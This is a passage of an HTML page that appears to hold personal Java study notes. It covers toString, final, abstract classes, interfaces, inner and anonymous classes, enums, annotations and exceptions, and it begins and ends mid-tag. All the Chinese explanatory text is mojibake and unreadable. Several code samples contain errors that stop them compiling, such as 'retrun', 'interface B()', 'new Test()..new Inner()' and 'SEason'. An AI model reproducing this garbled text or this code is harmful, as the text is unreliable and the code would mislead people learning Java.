title="toString"></a>toString</h1><h2 id="toString-æ–¹æ³•"><a href="#toString-æ–¹æ³•" class="headerlink" title="toString æ–¹æ³•"></a>toString æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    retrun <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.getName()+<span class="hljs-string">&quot;@&quot;</span>+Integer.toHexString(hashCode());<br>&#125;<br></code></pre></td></tr></table></figure><p>é»˜è®¤è¿”å›ï¼šå…¨ç±»å+@+å“ˆå¸Œå€¼çš„åå…­è¿›åˆ¶</p><p>å­ç±»å¾€å¾€é‡å†™ toString æ–¹æ³•ï¼Œç”¨äºè¿”å›å¯¹è±¡çš„å±æ€§ä¿¡æ¯</p><p>ç›´æ¥è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒtoString æ–¹æ³•ä¼šè¢«é»˜è®¤è°ƒç”¨</p><h2 id="finalize-æ–¹æ³•"><a href="#finalize-æ–¹æ³•" class="headerlink" title="finalize æ–¹æ³•"></a>finalize æ–¹æ³•</h2><p>å­ç±»é‡å†™è¯¥æ–¹æ³•ï¼Œé‡Šæ”¾èµ„æº</p><p>æŸä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•å¼•ç”¨æ—¶ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šé”€æ¯è¯¥å¯¹è±¡ï¼Œé”€æ¯å‰è°ƒç”¨ finalize æ–¹æ³•</p><p>ä¹Ÿå¯ä»¥é€šè¿‡ System.gc() ä¸»åŠ¨è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½†ä¸ä¸€å®šé©¬ä¸Šå›æ”¶</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p>aï¼‰ä¸å¸Œæœ›ç±»è¢«ç»§æ‰¿æ—¶</p><p>bï¼‰ä¸å¸Œæœ›å±æ€§å€¼è¢«ä¿®æ”¹æ—¶ï¼ˆå¸¸é‡ï¼‰</p><p>cï¼‰ä¸å¸Œæœ›çˆ¶ç±»çš„æ–¹æ³•è¢«å­ç±»è¦†ç›–&#x2F;é‡å†™ï¼ˆoverrideï¼‰</p><p>dï¼‰ä¸å¸Œæœ›å±€éƒ¨å˜é‡ï¼ˆå‚æ•°ï¼‰è¢«ä¿®æ”¹ï¼ˆå±€éƒ¨å˜é‡ï¼‰</p><p><strong>finalä¿®é¥°å®ä¾‹å±æ€§ï¼Œå¯ä»¥åœ¨å®šä¹‰æ—¶ï¼Œæ„é€ å™¨ã€æ™®é€šä»£ç å—ä¸­èµ‹å€¼</strong></p><p><strong>finalä¿®é¥°é™æ€å±æ€§ï¼Œå¯ä»¥åœ¨å®šä¹‰æ—¶ã€é™æ€ä»£ç å—ä¸­èµ‹åˆå€¼</strong></p><h2 id="final-æ³¨æ„äº‹é¡¹"><a href="#final-æ³¨æ„äº‹é¡¹" class="headerlink" title="final æ³¨æ„äº‹é¡¹"></a>final æ³¨æ„äº‹é¡¹</h2><p>aï¼‰final ä¿®é¥°å±æ€§å¿…é¡»èµ‹å€¼ï¼Œå¹¶ä¸”ä¸å¯ä¿®æ”¹</p><p>bï¼‰final å¯ä»¥ä¿®é¥°ç±»ã€å±æ€§ã€æ–¹æ³•å’Œå±€éƒ¨å˜é‡ï¼Œä¸èƒ½ä¿®é¥°æ„é€ å™¨</p><p>cï¼‰åŒ…è£…ç±»ï¼ˆDoubleã€Integerã€Floatã€Boolean ï¼‰å’Œ String éƒ½æ˜¯ final ç±»</p><p>dï¼‰final ä¿®é¥°ç±»ä¸èƒ½è¢«ç»§æ‰¿ï¼Œä½†èƒ½è¢«å®ä¾‹åŒ–ï¼ˆéœ€è¦ä¸è¢«å®ä¾‹åŒ–æŠŠç±»æ”¹æˆ privateï¼‰</p><p>eï¼‰final å’Œ static æ­é…ä½¿ç”¨ä¸ä¼šåŠ è½½ç±»</p><h1 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h1><h2 id="abstract-åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•"><a href="#abstract-åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•" class="headerlink" title="abstract åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•"></a>abstract åªèƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•</h2><p>ç”¨ abstract å…³é”®å­—ä¿®é¥°ä¸€ä¸ªç±»æ—¶ï¼Œè¿™ä¸ªç±»å°±å«æŠ½è±¡ç±»ï¼Œä¿®é¥°æ–¹æ³•æ—¶å°±å«æŠ½è±¡æ–¹æ³•</p><h2 id="æ³¨æ„äº‹é¡¹-2"><a href="#æ³¨æ„äº‹é¡¹-2" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>æŠ½è±¡ç±»å¯ä»¥æœ‰ä»»æ„æˆå‘˜ï¼Œå¯ä»¥è¢«ç»§æ‰¿ï¼Œå¯ä»¥æ²¡æœ‰æŠ½è±¡æ–¹æ³•</p><p><strong>æŠ½è±¡ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–</strong></p><p>æœ‰äº†æŠ½è±¡æ–¹æ³•ï¼Œè¿™ä¸ªç±»å¿…é¡»å£°æ˜ä¸º abstract</p><p>ç»§æ‰¿äº†æŠ½è±¡ç±»ï¼Œå¿…é¡»å®ç°æŠ½è±¡ç±»çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé™¤éå®ƒè‡ªå·±ä¹Ÿå£°æ˜ä¸º abstract ç±»</p><p><strong>æŠ½è±¡æ–¹æ³•ä¸èƒ½ä½¿ç”¨ privateã€final å’Œ static ä¿®é¥°</strong></p><h1 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h1><h2 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">interface æ¥å£å&#123;<br><span class="hljs-comment">//å±æ€§</span><br><span class="hljs-comment">//æ–¹æ³•</span><br>&#125;<br>class ç±»å implements æ¥å£å&#123;<br>å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨æ¥åˆ¶å®šè§„åˆ™</p><h2 id="æ³¨æ„äº‹é¡¹-3"><a href="#æ³¨æ„äº‹é¡¹-3" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>ä¸èƒ½è¢«å®ä¾‹åŒ–</li><li>æ¥å£çš„ä¿®é¥°åªèƒ½æ˜¯ public å’Œé»˜è®¤ï¼Œè¿™ç‚¹å’Œç±»çš„ä¿®é¥°ç¬¦æ˜¯ä¸€æ ·çš„</li><li>ä¸èƒ½ç»§æ‰¿å…¶ä»–çš„ç±»ï¼Œä½†å¯ä»¥ç»§æ‰¿å¤šä¸ªåˆ«çš„æ¥å£</li><li>æ¥å£ä¸­çš„æ–¹æ³•éƒ½æ˜¯ public æ–¹æ³•ï¼ŒæŠ½è±¡æ–¹æ³•å¯ä»¥ä¸ç”¨ abstract ä¿®é¥°ï¼Œpublic abstract å¯ä»¥çœç•¥</li><li>ä¸€ä¸ªæ™®é€šç±»å®ç°æ¥å£å°±å¿…é¡»å°†è¯¥æ¥å£çš„æ‰€æœ‰æ–¹æ³•å®ç°</li><li>æŠ½è±¡ç±»å®ç°æ¥å£ï¼Œå¯ä»¥ä¸ç”¨å®ç°æ¥å£çš„æ–¹æ³•</li><li>ä¸€ä¸ªç±»åŒæ—¶å¯ä»¥å®ç°å¤šä¸ªæ¥å£</li><li>æ¥å£ä¸­çš„å±æ€§éƒ½æ˜¯ <strong>public static final</strong> ä¿®é¥°ç¬¦</li></ul><p>â€‹è®¿é—®å½¢å¼ï¼š<strong>æ¥å£å. å±æ€§å</strong></p><h2 id="æ¥å£çš„å¤šæ€ç‰¹æ€§"><a href="#æ¥å£çš„å¤šæ€ç‰¹æ€§" class="headerlink" title="æ¥å£çš„å¤šæ€ç‰¹æ€§"></a>æ¥å£çš„å¤šæ€ç‰¹æ€§</h2><p>å¤šæ€å‚æ•°ã€å‘ä¸Šè½¬å‹ã€å¤šæ€æ•°ç»„</p><h2 id="æ¥å£çš„å¤šæ€ä¼ é€’"><a href="#æ¥å£çš„å¤šæ€ä¼ é€’" class="headerlink" title="æ¥å£çš„å¤šæ€ä¼ é€’"></a>æ¥å£çš„å¤šæ€ä¼ é€’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">A</span>&#123;&#125;<br>B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br></code></pre></td></tr></table></figure><h2 id="æ¥å£ã€ç»§æ‰¿"><a href="#æ¥å£ã€ç»§æ‰¿" class="headerlink" title="æ¥å£ã€ç»§æ‰¿"></a>æ¥å£ã€ç»§æ‰¿</h2><p>ç»§æ‰¿ï¼šæé«˜ä»£ç å¤ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§</p><p>æ¥å£ï¼šè®¾è®¡å¥½å„ç§æ–¹æ³•ï¼Œè®©å…¶ä»–ç±»å»å®ç°</p><h2 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AA</span>&#123;<span class="hljs-type">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><br>mainå‡½æ•°ä¸­ï¼š<br> BB b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>    System.out.println(b.a);<br>    System.out.println(AA.a);<br>    System.out.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="æˆå‘˜å†…éƒ¨ç±»"><a href="#æˆå‘˜å†…éƒ¨ç±»" class="headerlink" title="æˆå‘˜å†…éƒ¨ç±»"></a>æˆå‘˜å†…éƒ¨ç±»</h1><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><p>å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„æˆå‘˜ä½ç½®ä¸Š</p><p>aï¼‰æˆå‘˜å†…éƒ¨ç±»ï¼ˆæ—  static ä¿®é¥°ï¼‰</p><p>bï¼‰é™æ€å†…éƒ¨ç±»ï¼ˆä½¿ç”¨ static ä¿®é¥°ï¼‰</p><p>å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®ä¸Šï¼ˆæ¯”å¦‚æ–¹æ³•ç±»ï¼‰ï¼š</p><p>aï¼‰å±€éƒ¨å†…éƒ¨ç±»ï¼ˆæœ‰ç±»åï¼‰</p><p>bï¼‰åŒ¿åå†…éƒ¨ç±»ï¼ˆæ²¡æœ‰ç±»åï¼‰</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„æˆå‘˜ä½ç½®ä¸Šï¼Œæ²¡æœ‰ static ä¿®é¥°</p><h2 id="æ³¨æ„äº‹é¡¹-4"><a href="#æ³¨æ„äº‹é¡¹-4" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;butterfly&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> sex=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;OuterClass static block&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OuterClass</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass</span>&#123;<br>        <span class="hljs-keyword">public</span> String language=<span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">abc</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(name);<br>            System.out.println(age);<br>            System.out.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;InnerClass block&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InnerClass</span><span class="hljs-params">(String language)</span>&#123;<br>            <span class="hljs-built_in">this</span>.language=language;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦å»ä¿®é¥°æˆå‘˜å†…éƒ¨ç±»ï¼Œå› ä¸ºç›¸å½“äºä¸€ä¸ªæˆå‘˜</li><li>æˆå‘˜å†…éƒ¨ç±»ä¸èƒ½å®šä¹‰é™æ€æˆå‘˜</li><li>ä½œç”¨åŸŸä¸å…¶ä»–æˆå‘˜ä¸€æ ·</li><li>å¤–éƒ¨ç±»å¯ä»¥è®¿é—®æˆå‘˜å†…éƒ¨ç±»</li><li>å¤–éƒ¨å…¶ä»–ç±»å¯ä»¥è®¿é—®æˆå‘˜å†…éƒ¨ç±»</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()..<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br></code></pre></td></tr></table></figure><p>â€‹åœ¨å¤–éƒ¨ç±»é‡Œé¢å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›å†…éƒ¨ç±»çš„å¯¹è±¡</p><ul><li>å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»é‡åï¼Œå°±è¿‘åŸåˆ™ã€‚è®¿é—®å¤–éƒ¨ç±»æˆå‘˜ï¼Œä½¿ç”¨ï¼ˆå¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰å»è®¿é—®</li></ul><h2 id="è·å–å†…éƒ¨ç±»çš„ç±»å"><a href="#è·å–å†…éƒ¨ç±»çš„ç±»å" class="headerlink" title="è·å–å†…éƒ¨ç±»çš„ç±»å"></a>è·å–å†…éƒ¨ç±»çš„ç±»å</h2><p>getClassã€jeb</p><h1 id="é™æ€å†…éƒ¨ç±»"><a href="#é™æ€å†…éƒ¨ç±»" class="headerlink" title="é™æ€å†…éƒ¨ç±»"></a>é™æ€å†…éƒ¨ç±»</h1><h2 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>æœ‰ static ä¿®é¥°</p><h2 id="æ³¨æ„äº‹é¡¹-5"><a href="#æ³¨æ„äº‹é¡¹-5" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li><p>åªèƒ½è®¿é—®å¤–éƒ¨ç±»çš„é™æ€æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„</p></li><li><p>ä½œç”¨åŸŸå±äºæ•´ä¸ªç±»</p></li><li><p>å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦å»ä¿®é¥°é™æ€å†…éƒ¨ç±»</p></li><li><p>å¤–éƒ¨ç±»å¯ä»¥è®¿é—®é™æ€å†…éƒ¨ç±»</p></li><li><p>å¤–éƒ¨å…¶ä»–ç±»å¯ä»¥è®¿é—®é™æ€å†…éƒ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>.Inner();<br></code></pre></td></tr></table></figure><p>åœ¨å¤–éƒ¨ç±»é‡Œé¢å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›å†…éƒ¨ç±»çš„å¯¹è±¡</p><ul><li>å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»é‡åï¼Œå°±è¿‘åŸåˆ™ã€‚è®¿é—®å¤–éƒ¨ç±»æˆå‘˜ï¼Œä½¿ç”¨ï¼ˆå¤–éƒ¨ç±»å.é™æ€æˆå‘˜åï¼‰å»è®¿é—®</li></ul></li></ul><h1 id="å±€éƒ¨å†…éƒ¨ç±»"><a href="#å±€éƒ¨å†…éƒ¨ç±»" class="headerlink" title="å±€éƒ¨å†…éƒ¨ç±»"></a>å±€éƒ¨å†…éƒ¨ç±»</h1><h2 id="æ¦‚å¿µ-2"><a href="#æ¦‚å¿µ-2" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®ä¸Šï¼Œæ¯”å¦‚æ–¹æ³•ä¸­ï¼Œå¹¶ä¸”æœ‰ç±»å</p><h2 id="æ³¨æ„äº‹é¡¹-6"><a href="#æ³¨æ„äº‹é¡¹-6" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»æ‰€æœ‰æˆå‘˜</li><li>å¦‚æœå®šä¹‰åœ¨é™æ€æ–¹æ³•ä¸­ï¼Œåªèƒ½è®¿é—®å¤–éƒ¨ç±»çš„é™æ€æˆå‘˜</li><li>ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œå¯ä»¥ç”¨final ä¿®é¥°</li><li>ä½œç”¨åŸŸä»…åœ¨ä»£ç å—ä¸­ï¼Œä¸å±€éƒ¨å˜é‡ä¸€è‡´</li><li>é‡åéµå¾ªå°±è¿‘åŸåˆ™ï¼Œè®¿é—®å¤–éƒ¨ç±»æˆå‘˜ç”¨<strong>ï¼ˆå¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰</strong>å»è®¿é—®ï¼ˆå®ä¾‹æ–¹æ³•ä¸­ï¼‰ï¼Œé™æ€æ–¹æ³•ä¸­ï¼Œï¼ˆå¤–éƒ¨ç±»å.é™æ€æˆå‘˜åï¼‰è®¿é—®</li><li>å¤–éƒ¨ç±»ä¸èƒ½è®¿é—®å±€éƒ¨å†…éƒ¨ç±»</li></ul><h1 id="åŒ¿åå†…éƒ¨ç±»"><a href="#åŒ¿åå†…éƒ¨ç±»" class="headerlink" title="åŒ¿åå†…éƒ¨ç±»"></a>åŒ¿åå†…éƒ¨ç±»</h1><h2 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><p>åŸºäºæ¥å£çš„åŒ¿åå†…éƒ¨ç±»</p><p>åŸºäºç±»ï¼ˆæŠ½è±¡ç±»ï¼‰çš„åŒ¿åå†…éƒ¨ç±»</p><h2 id="æ³¨æ„äº‹é¡¹-7"><a href="#æ³¨æ„äº‹é¡¹-7" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>å¯ä»¥è®¿é—®å¤–éƒ¨ç±»ï¼Œå—è®¿é—®ä¿®é¥°ç¬¦å½±å“ï¼Œå±€éƒ¨å†…éƒ¨ç±»ä¸èƒ½å®šä¹‰é™æ€æˆå‘˜</li><li>åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹</li><li>å°±è¿‘åŸåˆ™ï¼ŒåŒ¿åå†…éƒ¨ç±»å¤„äºå¤–éƒ¨ç±»é‡Œé¢æ—¶<strong>ï¼ˆå¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰</strong>é™æ€æˆå‘˜ï¼ˆå¤–éƒ¨ç±»å.é™æ€ç±»åï¼‰</li><li>å¤–éƒ¨ç±»ä¸èƒ½è®¿é—®åŒ¿åå†…éƒ¨ç±»</li><li>åŒ¿åå†…éƒ¨ç±»åœ¨å®šä¹‰çš„åŒæ—¶ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œå¹¶ä¸”å½“ä½œå®å‚ä¼ é€’</li></ul><h1 id="æšä¸¾ç±»"><a href="#æšä¸¾ç±»" class="headerlink" title="æšä¸¾ç±»"></a>æšä¸¾ç±»</h1><h2 id="è‡ªå®šä¹‰æšä¸¾ç±»"><a href="#è‡ªå®šä¹‰æšä¸¾ç±»" class="headerlink" title="è‡ªå®šä¹‰æšä¸¾ç±»"></a>è‡ªå®šä¹‰æšä¸¾ç±»</h2><ul><li>æ„é€ å™¨ç§æœ‰åŒ–</li><li>public static final ä¿®é¥°çš„å±æ€§</li><li>åˆ›å»ºå¯¹è±¡èµ‹å€¼ç»™è¿™äº›å±æ€§</li><li>å®šä¹‰ toString æ–¹æ³•</li></ul><h2 id="enum-ç±»"><a href="#enum-ç±»" class="headerlink" title="enum ç±»"></a>enum ç±»</h2><ul><li>å…³é”®å­— enum ä»£æ›¿ class</li></ul><h2 id="ä½¿ç”¨å…³é”®å­—-enum-æ—¶ï¼Œä¼šå˜æˆ-final-ç±»ï¼Œå¹¶ä¸”éšå¼ç»§æ‰¿-Enum-ç±»"><a href="#ä½¿ç”¨å…³é”®å­—-enum-æ—¶ï¼Œä¼šå˜æˆ-final-ç±»ï¼Œå¹¶ä¸”éšå¼ç»§æ‰¿-Enum-ç±»" class="headerlink" title="ä½¿ç”¨å…³é”®å­— enum æ—¶ï¼Œä¼šå˜æˆ final ç±»ï¼Œå¹¶ä¸”éšå¼ç»§æ‰¿ Enum ç±»"></a>ä½¿ç”¨å…³é”®å­— enum æ—¶ï¼Œä¼šå˜æˆ final ç±»ï¼Œå¹¶ä¸”éšå¼ç»§æ‰¿ Enum ç±»</h2><ul><li>javap åç¼–è¯‘ class</li><li>ä¸èƒ½è¢«ç»§æ‰¿æˆ–å†ç»§æ‰¿å…¶ä»–ç±»ï¼Œä½†æ˜¯å¯ä»¥å®ç°æ¥å£</li><li>ä½¿ç”¨ Enum ç±»ç›¸å…³æ–¹æ³•</li></ul><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Season autumn=Season.AUTUMN;<br><span class="hljs-comment">//name()è¿”å›æšä¸¾å¯¹è±¡çš„åå­—</span><br>System.out.println(autumn.name());<br><span class="hljs-comment">//ordinal()è¿”å›æšä¸¾å¯¹è±¡çš„æ¬¡åº/ç¼–å·ï¼Œä»0å¼€å§‹ç¼–å·</span><br>System.out.println(autumn.ordinal());<br><span class="hljs-comment">//values()è¿”å›å®šä¹‰çš„æ‰€æœ‰æšä¸¾å¯¹è±¡</span><br>Season[] values=Season.values();<br><span class="hljs-comment">//valueOf()å°†å­—ç¬¦ä¸²è½¬æ¢æˆæšä¸¾å¯¹è±¡ï¼Œå­—ç¬¦ä¸²å¿…é¡»ä¸ºå·²æœ‰çš„æšä¸¾å¯¹è±¡å</span><br>Season autumn1=Season <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-string">&quot;AUTUMN&quot;</span>)</span>;<br>System.out.println(Season.SUMMER.compareTo(SEason.AUTUMN));<span class="hljs-comment">//ä¸¤ä¸ªå€¼ç›¸å‡</span><br><span class="hljs-comment">//toString()</span><br></code></pre></td></tr></table></figure><h1 id="æ³¨è§£"><a href="#æ³¨è§£" class="headerlink" title="æ³¨è§£"></a>æ³¨è§£</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="åŸºæœ¬-Annotation"><a href="#åŸºæœ¬-Annotation" class="headerlink" title="åŸºæœ¬ Annotation"></a>åŸºæœ¬ Annotation</h2><ul><li>@Overrideï¼šéªŒè¯æ–¹æ³•ä¸ºé‡å†™çˆ¶ç±»æ–¹æ³•ï¼Œåªèƒ½ç”¨äºæ–¹æ³•</li><li>@Deprecatedï¼šç”¨äºè¡¨ç¤ºæŸä¸ªå…ƒç´ ï¼ˆç±»&#x2F;æ–¹æ³•ç­‰ï¼‰å·²è¿‡æ—¶</li><li>@SuppressWarnings({â€œallâ€})ï¼šæŠ‘åˆ¶ç¼–è¯‘å™¨è­¦å‘Š</li></ul><h2 id="æ³¨è§£ç±»"><a href="#æ³¨è§£ç±»" class="headerlink" title="æ³¨è§£ç±»"></a>æ³¨è§£ç±»</h2><ul><li>@Targetï¼ˆElementType.METHODï¼‰ï¼ŒæŒ‡å®šæ³¨è§£èŒƒå›´</li><li>@Target ä¿®é¥°æ³¨è§£çš„æ³¨é‡Šï¼Œç§°ä¸ºå…ƒæ³¨è§£</li><li>@interface æ˜¯æ³¨è§£ç±»</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try åŒ…è£¹å¯èƒ½å‡ºç°å¼‚å¸¸ä»£ç ï¼Œcatch å»æ•è·å¼‚å¸¸ï¼Œtry å‡ºç°å¼‚å¸¸ï¼Œå‡ºç°å¼‚å¸¸çš„ä»£ç åé¢ä¸ä¼šæ‰§è¡Œ</p><h1 id="throws-ä¸-throw"><a href="#throws-ä¸-throw" class="headerlink" title="throws ä¸ throw"></a>throws ä¸ throw</h1><p>æŠ›å‡ºå¼‚å¸¸è¦ä¸çˆ¶ç±»ä¸€è‡´</p><p>throw: åé¢è·Ÿå¼‚å¸¸å¯¹è±¡</p><p>throws: åšå¼‚å¸¸å¤„ç†æ–¹å¼ï¼Œåœ¨æ–¹æ³•ä¸­</p><h1 id="åŒ…è£…ç±»"><a href="#åŒ…è£…ç±»" class="headerlink" title="åŒ…è£…ç±»"></a>åŒ…è£…ç±»</h1><h2 id="åŒ…è£…ç±»å‹å’Œ-String-ç±»å‹çš„è½¬æ¢"><a href="#åŒ…è£…ç±»å‹å’Œ-String-ç±»å‹çš„è½¬æ¢" class="headerlink" title="åŒ…è£…ç±»å‹å’Œ String ç±»å‹çš„è½¬æ¢"></a>åŒ…è£…ç±»å‹å’Œ String ç±»å‹çš„è½¬æ¢</h2><p>a) åŒ…è£…ç±»å‹è½¬ String ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 